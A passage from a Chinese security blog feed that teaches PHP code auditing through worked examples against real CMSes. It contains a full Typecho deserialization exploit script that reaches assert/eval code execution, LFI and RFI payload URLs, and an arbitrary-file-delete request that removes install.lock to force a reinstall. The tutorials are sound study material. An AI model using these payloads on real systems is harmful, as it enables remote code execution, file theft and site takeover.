字段值，然后<code>base64_decode()</code>在进行反序例化赋值给变量<code>$config</code>,然后我们全局搜索下魔术方法<code>__destruct</code>之类的发现没有可以利用的点.</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.7.png" alt="1.9.7"></p><p>然后我们跟进这个<code>Typecho_Db</code>类看看，他传入了<code>$config[&#39;adapter&#39;]</code> 和 <code>$config[&#39;prefix&#39;]</code>。</p><p>var\Typecho\Db.php</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.6.png" alt="1.9.6"></p><p>这里使用<code>.</code>连接<code>$adapterName</code>为一个类的话那么会触发<code>__toString()</code>这个魔术方法。</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.8.png" alt="1.9.8"></p><p>然后全局搜索<code>__toString()</code>,来看看那里可以利，找到<code>\var\Typecho\Feed.php</code>。</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.9.png" alt="1.9.9"></p><p>如果<code>$item[&#39;author&#39;]</code>是一个类且<code>screenName</code>是一个私有或者未定义的属性那么就会自动触发<code>__get()</code></p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.10.png" alt="1.9.10"></p><p>那么我们就搜索看看那里有可以利用的<code>__get()</code></p><p>在var\Typecho\Request.php 有这么一处</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.11.png" alt="1.9.11"></p><p>我把跟进的代码都放在了一块，其中__get 调用了 <code>get()</code>函数，然后它又调用了<code>_applyFilter()</code>函数，其中还有可以造成命令执行的回调函数<code>call_user_func()</code>和<code>array_map()</code> 其中参数还可以控制，那么我的攻击链也算找完了，下面来梳理一下</p><p>攻击链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">install.php</span><br><span class="line">        |</span><br><span class="line">绕过程序退出来到unserialize()</span><br><span class="line">        |</span><br><span class="line">db.php中__construct() 触发__toString()</span><br><span class="line">        |</span><br><span class="line">Feed.php中__toString触发__get()</span><br><span class="line">        |</span><br><span class="line">request.php中__get()调用get()-&gt;_applyFilter()-&gt;回调函数</span><br></pre></td></tr></table></figure><p>下面来构造exp，为了方便理解我们可以从尾到头来写</p><p>首先我们需要<code>_applyFilter</code>中的<code>$filter</code>的值为一个命令函数这里一般选择<code>assert()</code>,然后要让<code>get()</code>中的<code>$value</code>就是我们传入的命令也就是<code>_params[&#39;screenName&#39;]</code>，所以可以构造如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Typecho_Request</span><br><span class="line">&#123;</span><br><span class="line">    private $_params = array(&apos;screenName&apos; =&gt;&apos;eval(\&apos;phpinfo();exit();\&apos;)&apos;);</span><br><span class="line">    private $_filter = array(&apos;assert&apos;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>request.php</code>构造完了再构造<code>Feed.php</code>中需要的值,这里我们要进入<code>$item[&#39;author&#39;]-&gt;screenName</code>这个前面有个<code>self::RSS2 == $this-&gt;_type</code>语句 RSS2= RSS 2.0所以赋值对应的，这里的调用跟我前面写的那个CTF类似。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class  Typecho_Feed</span><br><span class="line">&#123;   </span><br><span class="line">    private $_type = &apos;RSS 2.0&apos;;</span><br><span class="line">    private $_items ;   </span><br><span class="line">    </span><br><span class="line">    public function __construct ()&#123;</span><br><span class="line">        $this-&gt;_items[] = array(&apos;author&apos; =&gt; new Typecho_Request());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后回到<code>install.php中</code> 看到<code>$db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code> 触发<code>db.php</code>中的<code>__construct()</code>需要传入2个值，但是有个是默认的所以我们传入一个我们序列化的上面的值就可以了。</p><p>payload :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Typecho_Request</span><br><span class="line">&#123;</span><br><span class="line">    private $_params = array(&apos;screenName&apos; =&gt;&apos;eval(\&apos;phpinfo();exit();\&apos;)&apos;);</span><br><span class="line">    private $_filter = array(&apos;assert&apos;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class  Typecho_Feed</span><br><span class="line">&#123;   </span><br><span class="line">    private $_type = &apos;RSS 2.0&apos;;</span><br><span class="line">    private $_items ;   </span><br><span class="line">    </span><br><span class="line">    public function __construct ()&#123;</span><br><span class="line">        $this-&gt;_items[] = array(&apos;author&apos; =&gt; new Typecho_Request());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload = array(&apos;adapter&apos;=&gt;new Typecho_Feed());</span><br><span class="line">echo base64_encode(serialize($payload));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>为什么这里payload <code>phpinfo();exit();</code>中有<code>exit()</code> ,因为程序开始使用了<code>ob_start()</code> 这个函数会把输出放进缓冲区，触发异常后<code>ob_end_clean()</code> 会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。</p><p><img src="/2019/09/28/1-9-反序列化审计/1.9.12.png" alt="1.9.12"></p><p>这类反序列化一般寻找起来还是很有难度的，个人感觉两头向中间来找方便一些，找到可以利用的入口，再到可以利用的函数，再从入口点想办法到利用点。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>反序列化的地方还可以搭配注入 比如espcms的search.php注入。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.8.变量覆盖审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-8-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-8-变量覆盖审计/</id>
    <published>2019-09-28T02:17:32.000Z</published>
    <updated>2019-09-28T03:00:16.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>变量覆盖，顾名思义就是可以覆盖已有变量值，导致变量覆盖的漏洞有：<code>extract()</code>、<code>parse_str()</code>、<code>import_request_variables()</code> 使用不当，或者使用了<code>$$</code>或者开启了全局变量注册。</p><h1 id="0x01-变量覆盖演示"><a href="#0x01-变量覆盖演示" class="headerlink" title="0x01 变量覆盖演示"></a>0x01 变量覆盖演示</h1><p><strong>extract()</strong></p><p><code>extract(array,extract_rules,prefix)</code><br>函数从数组中将变量导入到当前的符号表，即将数组中的键值对注册成函数，使用数组键名作为变量名，使用数组键值作为变量值。</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.1.png" alt="1.8.1"></p><p>可以看到我们初始变量值为a但是覆盖之后就变成了我们输入的值。</p><p><strong>parse_str()</strong></p><p><code>parse_str()</code>函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。在没有array参数的情况下使用此函数，并且在PHP 7.2中将废弃不设置参数的行为,此函数没有返回值。</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.2.png" alt="1.8.2"></p><p><strong>import_request_variables()</strong></p><p><code>import_request_variables ( string $types , string $prefix )</code><br>将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE。此函数只能用于PHP4.1 ~ PHP5.4。</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.3.png" alt="1.8.3"></p><p><strong>$$</strong></p><p>典型的例子就是foreach来遍历数组中的值作为变量。</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.4.png" alt="1.8.4"></p><p>其中<code>$_key</code>的值为a,那么 <code>$a</code>的值就被覆盖为2了。</p><p>还有全局注册register_globals这些，php配置默认都是关闭的。</p><h1 id="0x02-实战审计"><a href="#0x02-实战审计" class="headerlink" title="0x02 实战审计"></a>0x02 实战审计</h1><p>本次用到的是MetInfo cms的变量覆盖漏洞，跟进主页来到核心配置文件</p><p>\include\common.inc.php</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.5.png" alt="1.8.5"></p><p>看到文件的24~28行，明显用到了我们上面说的&amp;&amp;变量覆盖的写法，不过这里他用到了<code>daddslashes()</code>防注入，不过并不影响我们这章讲的知识。</p><p>随便来到一个子文件看看他的加载方式\news\index.php</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.6.png" alt="1.8.6"></p><p>第7行包含一个变量，那么这个变量在什么地方，我们跟进 include/module.php 看看，在本文件搜索<code>$module</code>变量。</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.7.png" alt="1.8.7"></p><p>这里其实低版本的源码中没有这句话<code>$module = &#39;&#39;;</code> 其中<code>$module</code>变量都在<code>$fmodule != 7</code> 这个if条件中，我给大家打包的是低版本，我安装错了。 也就是只要我们传入的<code>$fmodule</code>的值为7那么我们就可以覆盖这个<code>$module</code>的值</p><p><img src="/2019/09/28/1-8-变量覆盖审计/1.8.8.png" alt="1.8.8"></p><p>只要上传一张图片或者其他文件就可以包含了，因为<code>require_once</code>的时候并没有判断他的后缀名。</p><p>在变量覆盖的时候一定要注意初始化的值和覆盖的顺序。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.7.函数或弱类型的缺陷和特性</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-7-%E5%87%BD%E6%95%B0%E6%88%96%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%BC%BA%E9%99%B7%E5%92%8C%E7%89%B9%E6%80%A7/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-7-函数或弱类型的缺陷和特性/</id>
    <published>2019-09-28T02:17:20.000Z</published>
    <updated>2019-09-28T03:00:23.248Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-in-array"><a href="#0x00-in-array" class="headerlink" title="0x00  in_array()"></a>0x00  in_array()</h1><a id="more"></a><p><code>in_array(search,array,type)</code> 如果给定的值 search 存在于数组 array 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 false。 </p><p>那么为什么会出现安全问题呢，我们来看看下面代码</p><p><img src="/2019/09/28/1-7-函数或弱类型的缺陷和特性/1.7.1.png" alt="1.7.1"></p><p>在没设置第三个参数的情况下<code>in_array()</code>函数将会吧<code>1 and 1=1</code>转为数字1比较，那么这样就造成了一些安全问题，在注入或上传的情况下可能绕过。</p><h1 id="0x01-is-number"><a href="#0x01-is-number" class="headerlink" title="0x01 is_number()"></a>0x01 is_number()</h1><p><code>is_number()</code> 函数他会判断变量是否为数字或者数字字符串，假如我们传入的字符串为16进制，那么他也是认定为数字的。</p><p><img src="/2019/09/28/1-7-函数或弱类型的缺陷和特性/1.7.2.png" alt="1.7.2"></p><p>我们知道我们向mysql插入数据的时候是可以是16进制的，他取出来就会还原成原始字符串，这样用<code>is_number()</code> 函数检测后肯能就会存在二次注入。</p><h1 id="0x02-PHP弱类型的特性"><a href="#0x02-PHP弱类型的特性" class="headerlink" title="0x02 PHP弱类型的特性"></a>0x02 PHP弱类型的特性</h1><p>php是一款弱类型语言，他在使用==比较字符串的时候会把字符串类型转化成相同的再比较，那么这样也会造成一些问题.</p><p><img src="/2019/09/28/1-7-函数或弱类型的缺陷和特性/1.7.3.png" alt="1.7.3"></p><p>他能遇到字符串的0e,0x就会解析成对应的科学计数和16进制。</p><h1 id="0x03-switch"><a href="#0x03-switch" class="headerlink" title="0x03 switch()"></a>0x03 switch()</h1><p>case是数字类型时，switch会把参数转换为int类型</p><p><img src="/2019/09/28/1-7-函数或弱类型的缺陷和特性/1.7.4.png" alt="1.7.4"></p><h1 id="0x04-strcmp"><a href="#0x04-strcmp" class="headerlink" title="0x04 strcmp()"></a>0x04 strcmp()</h1><p>比较函数如果两者相等返回0，string1&gt;string2返回&gt;0 反之小于0。在5.3及以后的php版本中，当strcmp()括号内是一个数组与字符串比较时，也会返回0。</p><p><img src="/2019/09/28/1-7-函数或弱类型的缺陷和特性/1.7.5.png" alt="1.7.5"></p><h1 id="0x05-preg-match"><a href="#0x05-preg-match" class="headerlink" title="0x05 preg_match()"></a>0x05 preg_match()</h1><p>如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题。</p><p><img src="/2019/09/28/1-7-函数或弱类型的缺陷和特性/1.7.6.png" alt="1.7.6"></p><h1 id="0x06-文末"><a href="#0x06-文末" class="headerlink" title="0x06 文末"></a>0x06 文末</h1><p>当然还有反序列化、变量覆盖等等，这里就不全部写了，我会单独拿出来写，还有一些函数的特性留给大家自行搜索。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-in-array&quot;&gt;&lt;a href=&quot;#0x00-in-array&quot; class=&quot;headerlink&quot; title=&quot;0x00  in_array()&quot;&gt;&lt;/a&gt;0x00  in_array()&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.6.逻辑漏洞审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-6-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-6-逻辑漏洞审计/</id>
    <published>2019-09-28T02:17:04.000Z</published>
    <updated>2019-09-28T03:00:31.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><a id="more"></a><p>逻辑漏洞是指由于程序逻辑不严，或者函数使用不当，导致发生越权访问，cookies绕过，越权密码修改，重复安装等等问题。一般逻辑漏洞的挖掘需要对代码有一定阅读能力。</p><h1 id="0x01-越权"><a href="#0x01-越权" class="headerlink" title="0x01 越权"></a>0x01 越权</h1><p>越权一般是对cookies的验证不严或者没有验证，一般我们审计后台发现某个功能没有包含验证文件，那么很有可能发生越权操作，当然越权有很多不仅仅局限于一个后台访问的问题。在众多大型网站越权问题也时常发生的，这也是漏洞挖掘中大家都比较喜欢的，有些越权在黑盒测试中或许更加容易发现，所以代码审计大家灵活运用，不要局限了你的思路。越权是个大的专题，我应该是讲不了多少还是请大家多看看文章。</p><p>1.<strong>后台越权</strong>：后台某些页面没有引入验证文件</p><p><img src="/2019/09/28/1-6-逻辑漏洞审计/1.6.1.png" alt="1.6.1"></p><p>比如这里熊海cms如果我们删除这个验证，那么就可以直接访问这个页面，有很多程序员他会忘记每个页面都添加。</p><p>2.<strong>水平越权</strong>：一个用户尝试访问与他拥有相同权限的用户的资源，比如删除收获地址处没有验证权限,导致越权删除其他人的地址。</p><p>我们用zzzcms这个程序来做演示 zzzcms\form\index.php</p><p><img src="/2019/09/28/1-6-逻辑漏洞审计/1.6.2.png" alt="1.6.2"></p><p>他这里是edituser是没有越权的，我这里只是讲解一下，简单的介绍一下越权如何去审计。我们看这个代码他最后update的时候是修改我们的uid现对的值，而我们的uid是POST包获取的，也就是如果我们可控uid那么就能越权修改其他人的资料。<br>但是这里有一条验证<code>$uid != get_session( &#39;uid&#39; )and back( &#39;很抱歉，资料修改失败&#39; );</code> 所以没办法越权，为了演示我们可以删除了来看看。</p><p><img src="/2019/09/28/1-6-逻辑漏洞审计/1.6.3.png" alt="1.6.3"></p><p>成功把UID为1的用户的资料修改了。</p><p>3.<strong>垂直越权</strong>：一个低级用户尝试访问高级别用户的功能。</p><h1 id="0x02-cookies验证不严"><a href="#0x02-cookies验证不严" class="headerlink" title="0x02 cookies验证不严"></a>0x02 cookies验证不严</h1><p>这里用到熊海CMS，我们随便点击一个后台页面，前面包含了一个验证文件<code>require &#39;../inc/checklogin.php&#39;;</code> 来看看这个文件</p><p><img src="/2019/09/28/1-6-逻辑漏洞审计/1.6.4.png" alt="1.6.4"></p><p>判断我们的cookies里面user是否为空，不为空就可以访问后台了。</p><p><img src="/2019/09/28/1-6-逻辑漏洞审计/1.6.5.png" alt="1.6.5"></p><h1 id="0x03-安装程序逻辑问题"><a href="#0x03-安装程序逻辑问题" class="headerlink" title="0x03 安装程序逻辑问题"></a>0x03 安装程序逻辑问题</h1><p>这里找了半天源码发现红日安全写过一个Simple-Log1.6这里就用他这个源码了。</p><p><img src="/2019/09/28/1-6-逻辑漏洞审计/1.6.6.png" alt="1.6.6"></p><p>这里他判断是否安装了,然后就直接跳转到主页，而程序没有退出，那么后面的依然可以执行，也就是说直接post后面的程序即可安装。</p><p><img src="/2019/09/28/1-6-逻辑漏洞审计/1.6.7.png" alt="1.6.7"></p><p>这类没有正确退出的造成的漏洞还是蛮多的，在后台等地方可以好好关注一下。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>当然逻辑漏洞不止就这些，还有其他的问题比如验证码逻辑的绕过，函数的缺陷，推荐大家多看看别人的审计文章。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://wq371680537.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>1.5.文件操作审计</title>
    <link href="https://wq371680537.github.io/2019/09/28/1-5-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%A1%E8%AE%A1/"/>
    <id>https://wq371680537.github.io/2019/09/28/1-5-文件操作审计/</id>
    <published>2019-09-28T02:16:49.000Z</published>
    <updated>2019-09-28T03:00:38.649Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-文件包含"><a href="#0x00-文件包含" class="headerlink" title="0x00 文件包含"></a>0x00 文件包含</h1><a id="more"></a><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>本地文件包含（Local File Include）简称 LFI，文件包含在php中，一般涉及到的危险函数有<code>include()</code>、<code>include_once()</code>、<code>require()</code>、<code>require_once()</code>，在包含文件名中存在可控变量的话就可能存在包含漏洞，由于这几个函数的特性也可能产生其他漏洞，后面一一讲到。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;name&apos;];</span><br><span class="line">    include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini</span><br></pre></td></tr></table></figure><p>这是个最简单的文件包含，没有任何过滤。但是一般程序不会这么写，一般会指定后缀，这样我们就需要截断来绕过了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;name&apos;];</span><br><span class="line">    include($file . &quot;html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在PHP5.2.x中我们可以通过使用%00来截断后面的内容、也可以使用路径长度截断，不过都在php5.3中被修复了。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini%00</span><br></pre></td></tr></table></figure><p><img src="/2019/09/28/1-5-文件操作审计/1.5.1.png" alt="1.5.1"></p><p>利用字符.或者/.或者./来截断。系统文件路径长度限制：windows 259个byteslinux 4096个bytes。</p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>远程文件包含漏洞(Remote File Inclusion)简称RFI，他需要我们的php.ini中配置<code>allow_url_include</code>、 <code>allow_url_fopen</code>。</p><p>1.包含远程文件 </p><p>需要打开<code>allow_url_include=On</code>、 <code>allow_url_fopen = On</code></p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.2.png" alt="1.5.2"></p><p>他可以利用?号截断，不受版本限制</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?name=http://127.0.0.1/1.txt?</span><br></pre></td></tr></table></figure><p>2.伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p>各种伪协议的使用方法网上很多，大家搜索一下吧。</p><h3 id="实战审计"><a href="#实战审计" class="headerlink" title="实战审计"></a>实战审计</h3><p>直接看主页index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//单一入口模式</span><br><span class="line">error_reporting(0); //关闭错误显示</span><br><span class="line">$file=addslashes($_GET[&apos;r&apos;]); //接收文件名</span><br><span class="line">$action=$file==&apos;&apos;?&apos;index&apos;:$file; //判断为空或者等于index</span><br><span class="line">include(&apos;files/&apos;.$action.&apos;.php&apos;); //载入相应文件</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>他会包含files目录下的文件，因为他没有过滤../所以可以包含任意目录下的文件，由于加了后缀所以漏洞存在于低版本php。</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.3.png" alt="1.5.3"></p><h1 id="0x01-任意文件删除"><a href="#0x01-任意文件删除" class="headerlink" title="0x01 任意文件删除"></a>0x01 任意文件删除</h1><p>任意文件删除审计一般来说我们都是搜索函数<code>unlink</code> 然后回溯去看。</p><p>inc\zzz_file.php</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.4.png" alt="1.5.4"></p><p>首先判断传入的参数是否为空，然后拼接路径，第516行中出现了一个函数<code>ifstrin</code>,我们跟进看看</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.5.png" alt="1.5.5"></p><p>只是个简单的判断没啥特殊情况，我们再来看看拿来调用了这个文件。</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.6.png" alt="1.5.6"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function file_path( $path ) &#123;</span><br><span class="line">    $list=array();</span><br><span class="line">$path= substr( $path, 0, strrpos( $path, &apos;/&apos; ));</span><br><span class="line">    $list=splits($path,&apos;/&apos;);</span><br><span class="line">    return $list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arr_search($arr1, $arr2 ) &#123;</span><br><span class="line">    $result=false;</span><br><span class="line">    foreach ( $arr1 as $v ) &#123;</span><br><span class="line">       if(in_array( $v,$arr2 )) return true;        </span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取参数，然后看看我们传入的路径是否存在这个数组里面的值，也就是基本上是没有过滤的，因为我们完全可以通过../ 跳回去。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /zzzp6p/admin/save.php?act=delfile</span><br><span class="line"></span><br><span class="line">path=/zzzp6p/upload/../install/1install.lock</span><br></pre></td></tr></table></figure><p>这里我们走的下面的分支不能删除 <code>array( &#39;php&#39;, &#39;db&#39;, &#39;mdb&#39;, &#39;tpl&#39; )</code> 这个数组的文件。</p><p>要删除任意文件只需要使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path=/zzzp6p/runtime/../install/1.db</span><br></pre></td></tr></table></figure><p>让<code>ifstrin()</code>为true走上面的分支即可。</p><p>一般来说我们任意文件删除 是配合删除install.lock来达到网站重装漏洞。</p><h1 id="0x02-任意文件下载"><a href="#0x02-任意文件下载" class="headerlink" title="0x02 任意文件下载"></a>0x02 任意文件下载</h1><p>任意文件下载常见于文件的显示和下载的地方，一般关注的文件是和下载有关的，比如download。当然你还可以搭建源码，来寻找能够下载的地方。</p><p>常见的下载或读取函数: <code>file_get_contents()</code>、<code>readfile()</code> 、<code>fopen()</code></p><p>在网上找到个别人审计的实例，结合起来审计一下，用到的源码是Ear_Music_20180820_UTF8</p><p>搜索down相关的词语，找到文件\template\default\source\down.php</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.7.png" alt="1.5.7"></p><p>我们看看<code>$file</code>参数怎么来的,先是调用函数<code>getfield()</code>,转到函数去看看</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.8.png" alt="1.5.8"></p><p>不出意外应该是从数据库中读取路径，再来看看<code>geturl()</code>函数</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.9.png" alt="1.5.9"></p><p>构造下载地址，这些地方没什么问题，我们来看看什么地方对储存地址的表中插入了数据，搜索表名<code>lyric</code>。</p><p>\source\user\music\ajax.php</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.10.png" alt="1.5.10"></p><p>我们看到<code>$lyric</code>经过 <code>checkrename</code>、 <code>SafeRequest</code>这两个函数的清洗，先来转到函数<code>SafeRequest</code>。</p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.11.png" alt="1.5.11"></p><p>我们传入的mode是get，然后经过<code>addslashes()</code>的转义，下面在替换为空，也就是我们基本上是不能使用<code>\\</code>了，我们在看看<code>checkrename</code></p><p><img src="/2019/09/28/1-5-文件操作审计/1.5.12.png" alt="1.5.12"></p><p>这里正则匹配了我们的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\ </span><br><span class="line">?iframe=</span><br><span class="line">.php?</span><br></pre></td></tr></table></figure><p>这里完全看不懂他匹配后缀为php?这个的意义何在，直接php就绕过了。</p><p>所以综合起来就是不要带有<code>\ 和 ./</code> 这里我们只要传入绝对路径就可以了</p><p>登陆前台找到上传歌曲的页面在歌词地址中插入payload</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:/phpstudy/PHPTutorial/WWW/Ear_Music/template/default/source/down.php</span><br></pre></td></tr></table></figure><p><img src="/2019/09/28/1-5-文件操作审计/1.5.13.png" alt="1.5.13"></p><h1 id="0x03-文件上传"><a 